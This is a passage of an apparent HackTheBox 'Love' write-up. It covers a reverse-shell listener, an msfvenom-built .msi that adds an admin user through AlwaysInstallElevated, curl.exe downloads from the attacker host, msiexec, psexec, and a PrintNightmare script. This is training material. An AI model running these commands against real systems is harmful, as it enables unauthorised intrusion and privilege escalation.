aQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA</span><span class=o>=</span>
</span></span></code></pre></div><p>On my listener.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «love» «10.10.14.51» 
</span></span><span class=line><span class=cl>$ rlwrap nc -nvlp <span class=m>53</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>53</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.51<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.239<span class=o>]</span> <span class=m>49950</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PS C:<span class=se>\x</span>ampp<span class=se>\h</span>tdocs<span class=se>\o</span>mrs<span class=se>\i</span>mages&gt;
</span></span></code></pre></div><p>The user flag is done here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>PS C:<span class=se>\U</span>sers<span class=se>\P</span>hoebe<span class=se>\D</span>esktop&gt; dir
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\U</span>sers<span class=se>\P</span>hoebe<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                 LastWriteTime         Length Name                                                                 
</span></span><span class=line><span class=cl>----                 -------------         ------ ----                                                                 
</span></span><span class=line><span class=cl>-ar---          8/8/2021   3:50 AM             <span class=m>34</span> user.txt                                                             
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PS C:<span class=se>\U</span>sers<span class=se>\P</span>hoebe<span class=se>\D</span>esktop&gt; <span class=nb>type</span> user.txt
</span></span><span class=line><span class=cl>65a5...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><p>The flag also accessible using SSRF.</p><p><div class=img-container><img src=imgs/image-20210809043334065.png alt=image-20210809043334065></div></p><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-system>Shell as SYSTEM<a class=anchor aria-hidden=true href=#shell-as-system>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>WinPEAS finds that <code>AlwaysInstallElevated</code> is set to 1. This means installation of an app always runs in elevated mode (SYSTEM), and it can be abused to install a malicious <code>.msi</code> package.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>[+] Checking AlwaysInstallElevated
</span></span><span class=line><span class=cl>   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
</span></span><span class=line><span class=cl>    AlwaysInstallElevated set to 1 in HKLM!
</span></span><span class=line><span class=cl>    AlwaysInstallElevated set to 1 in HKCU!
</span></span></code></pre></div><h4 id=exploitation---malicious-msi-installer>Exploitation - Malicious .msi Installer<a class=anchor aria-hidden=true href=#exploitation---malicious-msi-installer>#</a></h4><p>I will generate a malicious <code>.msi</code> that will add a user with administrative access using <code>msfvenom</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.51» 
</span></span><span class=line><span class=cl>$ msfvenom -p windows/adduser <span class=nv>USER</span><span class=o>=</span>iamf <span class=nv>PASS</span><span class=o>=</span>P@ssword123! -f msi -o iamf.msi
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> No arch selected, selecting arch: x86 from the payload
</span></span><span class=line><span class=cl>No encoder specified, outputting raw payload
</span></span><span class=line><span class=cl>Payload size: <span class=m>270</span> bytes
</span></span><span class=line><span class=cl>Final size of msi file: <span class=m>159744</span> bytes
</span></span><span class=line><span class=cl>Saved as: iamf.msi
</span></span></code></pre></div><p>I will host the <code>.msi</code> using Python web server.</p><p>On Love, I will grab the msi and install the package immediately.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>PS C:<span class=se>\U</span>sers<span class=se>\P</span>ublic&gt; curl.exe -O 10.10.14.53/iamf.msi
</span></span><span class=line><span class=cl>PS C:<span class=se>\U</span>sers<span class=se>\P</span>ublic&gt; msiexec /quiet /qn /i iamf.msi
</span></span><span class=line><span class=cl>PS C:<span class=se>\U</span>sers<span class=se>\P</span>ublic&gt; net user
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User accounts <span class=k>for</span> <span class=se>\\</span>LOVE                                                                                                                                                   
</span></span><span class=line><span class=cl>                                                                                                                                                                           
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------                                                                                            
</span></span><span class=line><span class=cl>Administrator            DefaultAccount           Guest                                                                                                                    
</span></span><span class=line><span class=cl>iamf                     Phoebe                   WDAGUtilityAccount                                                                                                       
</span></span><span class=line><span class=cl>The <span class=nb>command</span> completed successfully.                                                                                                                                        
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PS C:<span class=se>\U</span>sers<span class=se>\P</span>ublic&gt; 
</span></span></code></pre></div><h4 id=psexec---system>Psexec - SYSTEM<a class=anchor aria-hidden=true href=#psexec---system>#</a></h4><p>I can login using my backdoor user with help of <code>psexec.py</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «exploits» «10.10.14.49» 
</span></span><span class=line><span class=cl>$ psexec.py love/iamf:<span class=s1>&#39;P@ssword123!&#39;</span>@10.10.10.239                                            
</span></span><span class=line><span class=cl>Impacket v0.9.22 - Copyright <span class=m>2020</span> SecureAuth Corporation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Requesting shares on 10.10.10.239.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found writable share ADMIN$
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Uploading file VlzRTIEE.exe
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Opening SVCManager on 10.10.10.239.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Creating service lRbn on 10.10.10.239.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting service lRbn.....
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Press <span class=nb>help</span> <span class=k>for</span> extra shell commands
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.19042.867<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> <span class=m>2020</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>INDOWS<span class=se>\s</span>ystem32&gt;whoami
</span></span><span class=line><span class=cl>nt authority<span class=se>\s</span>ystem
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>INDOWS<span class=se>\s</span>ystem32&gt;hostname
</span></span><span class=line><span class=cl>love
</span></span></code></pre></div><h4 id=alternative-printnightmare>(Alternative) PrintNightmare<a class=anchor aria-hidden=true href=#alternative-printnightmare>#</a></h4><p>Love also vulnerable to LPE <a href=https://github.com/calebstewart/CVE-2021-1675>PrintNightmare</a>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>PS C:<span class=se>\U</span>sers<span class=se>\P</span>hoebe<span class=se>\D</span>ownloads&gt; Get-Service -name spooler
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Status   Name               DisplayName
</span></span><span class=line><span class=cl>------   ----               -----------
</span></span><span class=line><span class=cl>Running  spooler            Print Spooler
</span></span><span class=line><span class=cl>PS C:<span class=se>\U</span>sers<span class=se>\P</span>hoebe<span class=se>\D</span>ownloads&gt; curl.exe -O 10.10.14.51/CVE-2021-1675.ps1
</span></span><span class=line><span class=cl>PS C:<span class=se>\U</span>sers<span class=se>\P</span>hoebe<span class=se>\D</span>ownloads&gt; Import-Module .<span class=se>\C</span>VE-2021-1675.ps1
</span></span><span class=line><span class=cl>PS C:<span class=se>\U</span>sers<span class=se>\P</span>hoebe<span class=se>\D</span>ownloads&gt; Invoke-Nightmare
</span></span><span class=line><span class=cl>PS C:<span class=se>\U</span>sers<span class=se>\P</span>hoebe<span class=se>\D</span>ownloads&gt; net user
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User accounts <span class=k>for</span> <span class=se>\\</span>LOVE
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>adm1n                    Administrator            DefaultAccount           
</span></span><span class=line><span class=cl>Guest                    iamf                     Phoebe                   
</span></span><span class=line><span class=cl>WDAGUtilityAccount       
</span></span><span class=line><span class=cl>The <span class=nb>command</span> completed successfully.
</span></span></code></pre></div><p>I can login via WinRM.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «love» «10.10.14.51» 
</span></span><span class=line><span class=cl>$ evil-winrm -i 10.10.10.239 -u <span class=s1>&#39;adm1n&#39;</span> -p<span class=s1>&#39;P@ssw0rd&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Evil-WinRM shell v2.4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\a</span>dm1n<span class=se>\D</span>ocuments&gt; hostname
</span></span><span class=line><span class=cl>Love
</span></span></code></pre></div><div class=post-references><h2>References</h2><ul><li><a href=https://portswigger.net/web-security/ssrf target=_blank rel="noopener noreferrer">https://portswigger.net/web-security/ssrf</a></li><li><a href=https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated target=_blank rel="noopener noreferrer">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated</a></li><li><a href=https://github.com/calebstewart/CVE-2021-1675 target=_blank rel="noopener noreferrer">https://github.com/calebstewart/CVE-2021-1675</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/windows/>Windows</a></li><li><a href=https://fahmifj.github.io/tags/ssrf/>SSRF</a></li><li><a href=https://fahmifj.github.io/tags/alwaysinstallelevated/>AlwaysInstallElevated</a></li><li><a href=https://fahmifj.github.io/tags/msi-installer/>msi-installer</a></li><li><a href=https://fahmifj.github.io/tags/msfvenom/>msfvenom</a></li><li><a href=https://fahmifj.github.io/tags/printnightmare/>PrintNightmare</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Love on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Love&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2flove%2f&hashtags=Windows%2cSSRF%2cAlwaysInstallElevated%2cmsi-installer%2cmsfvenom%2cPrintNightmare"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Love on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2flove%2f&title=HackTheBox%20-%20Love&summary=HackTheBox%20-%20Love&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2flove%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Love on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2flove%2f&title=HackTheBox%20-%20Love"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Love on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2flove%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Love on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Love%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2flove%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Love on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Love&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2flove%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>